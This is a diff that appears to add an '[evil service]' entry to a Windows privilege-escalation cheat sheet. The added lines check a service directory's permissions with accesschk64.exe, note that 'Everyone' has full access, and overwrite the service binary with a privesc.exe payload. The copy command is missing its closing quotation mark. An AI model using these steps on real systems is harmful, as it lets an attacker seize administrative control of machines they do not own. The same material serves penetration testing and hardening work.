@@ -603,3 +603,11 @@ void ControlHandler(DWORD request)
 } 
 ```
 
+### [evil service]
+```
+accesschk64.exe -wvu "c:\path\of\service\directory"
+“Everyone” user group has “FILE_ALL_ACCESS”
+
+copy /y c:\path\to\privesc.exe "c:\path\of\service\directory\servicebinaryname.exe
+```
+
